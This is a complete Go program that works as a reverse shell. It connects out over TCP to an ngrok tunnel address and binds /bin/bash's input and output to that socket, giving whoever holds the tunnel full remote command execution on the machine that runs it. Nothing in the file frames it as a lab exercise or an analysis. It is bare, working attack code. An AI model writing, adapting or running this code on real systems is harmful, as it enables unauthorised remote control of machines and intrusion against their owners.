package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
        fmt.Println("Initiate shell...")
	con, _ := net.Dial("tcp", "4.tcp.ngrok.io:14602")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	err := cmd.Run()
        if err != nil{
            fmt.Println(err)
        }

}
